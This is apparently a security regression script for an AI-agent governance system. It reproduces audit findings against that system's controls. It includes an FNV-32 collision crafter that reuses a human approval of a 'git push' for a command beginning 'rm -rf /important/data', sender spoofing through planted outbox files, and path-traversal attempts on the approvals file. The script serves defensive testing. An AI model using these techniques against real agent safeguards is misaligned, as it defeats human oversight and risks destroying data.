'use strict';
/**
 * v0.14 reproduction of the v0.13 findings (runs before AND after the fix; the output is compared).
 * Only temp hives under %TEMP% are touched.
 */
const R = require('path').resolve(__dirname, '..', '..', '..');
const loadTs = require(R + '/test/load-ts.cjs');
const electron = require.resolve(R + '/node_modules/electron');
require.cache[electron] = { id: electron, filename: electron, loaded: true, exports: { Notification: class { show() {} static isSupported() { return false; } } } };
const fs = require('fs'), os = require('os'), p = require('path');
const nodeFs = require('node:fs');
const { CimaRuntimeService } = loadTs('src/main/cimaRuntime.ts');
const gov = loadTs('src/shared/lapitaya/governance.ts');
const risk = loadTs('src/shared/lapitaya/toolRisk.ts');
const { HiveManager } = loadTs('src/main/hive.ts');
const out = (k, v) => console.log(k.padEnd(46), typeof v === 'string' ? v : JSON.stringify(v));
const mk = () => { const d = fs.mkdtempSync(p.join(os.tmpdir(), 'v14-')); const hive = p.join(d, 'hive'); fs.mkdirSync(p.join(hive, 'lapitaya'), { recursive: true }); return { d, hive, dir: p.join(hive, 'lapitaya') }; };
const svc = (hive, x = {}) => new CimaRuntimeService({ hiveRoot: () => hive, godId: () => 'god', ...x });
const step = (n, f) => { try { f(); } catch (e) { out(n + ' PROBE ERROR', String(e && e.stack || e).slice(0, 300)); } };

// ── FNV-32 collision construction (meet in the middle on 4 free bytes, iterating numeric prefixes)
const P = 0x01000193;
const inv32 = (a) => { let x = a; for (let i = 0; i < 5; i++) x = Math.imul(x, 2 - Math.imul(a, x)) >>> 0; return x >>> 0; };
const Pinv = inv32(P);
const fwd = (h, s) => { for (const c of Buffer.from(s)) { h ^= c; h = Math.imul(h, P) >>> 0; } return h >>> 0; };
const unwind = (h, b) => ((Math.imul(h, Pinv) >>> 0) ^ b) >>> 0;
const chars = []; for (let c = 33; c < 127; c++) if (c !== 34 && c !== 92) chars.push(c);
function craft(agent, tool, base, target) {
  for (let v = 0; v < 5000; v++) {
    const pfx = base + v + ' ';
    const s0 = fwd(0x811c9dc5, `${agent}\u0000${tool}\u0000{"command":"${pfx}`);
    const Rr = unwind(unwind(target >>> 0, 125), 34);
    const back = new Map();
    for (const b3 of chars) for (const b4 of chars) back.set(unwind(unwind(Rr, b4), b3), [b3, b4]);
    for (const b1 of chars) for (const b2 of chars) {
      let h = Math.imul((s0 ^ b1) >>> 0, P) >>> 0; h = Math.imul((h ^ b2) >>> 0, P) >>> 0;
      if (back.has(h)) { const [b3, b4] = back.get(h); return pfx + String.fromCharCode(b1, b2, b3, b4); }
    }
  }
  return null;
}
module.exports = { craft };
if (require.main !== module) return;

step('R1 FNV', () => {
  const { hive } = mk(); const s = svc(hive);
  const A = { command: 'git push origin feature-x' };
  const a1 = s.authorize('agent-1', 'Bash', A);
  out('CALL A first call', [a1.decision, a1.risk]);
  s.decide(s.listApprovals()[0].id, true, 'human');
  const cmdB = craft('agent-1', 'Bash', 'rm -rf /important/data # ', parseInt(gov.toolCallFingerprint('agent-1', 'Bash', A), 16));
  const B = { command: cmdB };
  out('CALL A  FNV-32', gov.toolCallFingerprint('agent-1', 'Bash', A));
  out('CALL B', cmdB);
  out('CALL B  FNV-32', gov.toolCallFingerprint('agent-1', 'Bash', B));
  const b = s.authorize('agent-1', 'Bash', B);
  out('R1 RESULT authorize(B) after approving A', [b.decision, b.category, b.rule]);
  const a2 = s.authorize('agent-1', 'Bash', A);
  out('R1 authorize(A) after B consumed approval', [a2.decision]);
});
step('R2 sender spoof (routeOnce)', () => {
  const home = fs.mkdtempSync(p.join(os.tmpdir(), 'v14h-'));
  const hive = new HiveManager(() => home);
  return hive.ensureAgent({ id: 'god', name: 'El Inge', provider: 'claude', cwd: home, isGod: true })
    .then(() => hive.ensureAgent({ id: 'attacker', name: 'A', provider: 'claude', cwd: home }))
    .then(() => hive.ensureAgent({ id: 'victim', name: 'V', provider: 'claude', cwd: home }))
    .then(() => {
      // (a) attacker plants a file in god's outbox: attribution = directory owner
      const o = p.join(hive.root(), 'agents', 'god', 'outbox'); fs.mkdirSync(o, { recursive: true });
      fs.writeFileSync(p.join(o, 'spoof.json'), JSON.stringify({ to: 'victim', act: 'request', subject: 'x', body: 'planted' }));
      // (b) attacker's own outbox claims from:'god'
      const o2 = p.join(hive.root(), 'agents', 'attacker', 'outbox');
      fs.writeFileSync(p.join(o2, 'fake-from.json'), JSON.stringify({ from: 'god', agent_id: 'god', to: 'victim', act: 'request', subject: 'y', body: 'claimed' }));
      let n = hive.routeOnce();
      const inbox = hive.inbox ? hive.inbox('victim') : [];
      out('R2 routed / victim inbox senders', [n, inbox.map((m) => m.from + ':' + m.subject)]);
      // (c) governance of the write itself
      const l = new CimaRuntimeService({ hiveRoot: () => hive.root(), godId: () => 'god' });
      const w = l.authorize('attacker', 'Write', { file_path: p.join(o, 'm.json').replace(/\\/g, '/'), content: '{}' });
      out('R2 authorize Write into god outbox', [w.decision, w.rule]);
      const sh = l.authorize('attacker', 'Bash', { command: `echo {} > ${p.join(o, 'm2.json').replace(/\\/g, '/')}` });
      out('R2 authorize shell > god outbox', [sh.decision, sh.rule]);
      fs.rmSync(home, { recursive: true, force: true });
    });
});
step('R3 path', () => {
  const { hive } = mk(); const s = svc(hive); const h = hive.replace(/\\/g, '/');
  for (const f of [`${h}/lapitaya/approvals.json`, `C:/Windows/../${h.slice(3)}/lapitaya/approvals.json`, `${h}/agents/x/../../lapitaya/approvals.json`, `${h}\\lapitaya\\.\\approvals.json`, `${h}/LAPITAYA/approvals.json`, `${h}/lapitaya./approvals.json`, `${h}//lapitaya//approvals.json`, `lapitaya/approvals.json`]) {
    const a = s.authorize('agent-1', 'Write', { file_path: f, content: '[]' });
    out('R3 Write ' + f.slice(-40), [a.decision, a.category, a.rule]);
  }
});
step('R4 lock held', () => {
  const { hive, dir } = mk(); const s = svc(hive);
  fs.writeFileSync(p.join(dir, '.governance.lock'), '');
  const t0 = Date.now(); const r = s.authorize('agent-1', 'Read', { file_path: 'x.ts' });
  out('R4 authorize while another holds the lock', [r.decision, r.rule, 'ms=' + (Date.now() - t0), 'lockFileStillThere=' + fs.existsSync(p.join(dir, '.governance.lock'))]);
});
step('R5 secondary writes', () => {
  const { hive, dir } = mk(); const s = svc(hive);
  s.authorize('agent-1', 'Bash', { command: 'git push origin x' });
  const id = s.listApprovals()[0].id;
  s.recordTrace('agent-2', 'PostToolUse', 'Bash', { command: 'npm test' }, 'ok');
  const orig = nodeFs.openSync;
  nodeFs.openSync = function (path, flags, ...r) { if (String(path).endsWith('cima-ledger.jsonl') && String(flags).startsWith('a')) throw new Error('EIO simulated'); return orig.call(this, path, flags, ...r); };
  try {
    const d = s.decide(id, true, 'human');
    const rec = s.submit('agent-2', { taskId: 'T', phase: 'BUILD', verdict: 'PASS', evidence: [{ type: 'test-result', source: 'npm test' }] });
    const tr = s.recordTrace('agent-2', 'PostToolUse', 'Bash', { command: 'npm run build' }, 'ok');
    out('R5 decide() with ledger down', [d && d.status]);
    out('R5 submit() with ledger down', [rec.verdict]);
    out('R5 recordTrace() with traces ledger ok', !!tr); out('R5 records in memory', s.cimaRecords().length);
  } finally { nodeFs.openSync = orig; }
  out('R5 approvals.json status after', JSON.parse(fs.readFileSync(p.join(dir, 'approvals.json'), 'utf8')).map((a) => a.status));
  out('R5 ledger has HUMAN_APPROVED?', fs.existsSync(p.join(dir, 'cima-ledger.jsonl')) && fs.readFileSync(p.join(dir, 'cima-ledger.jsonl'), 'utf8').includes('HUMAN_APPROVED'));
});
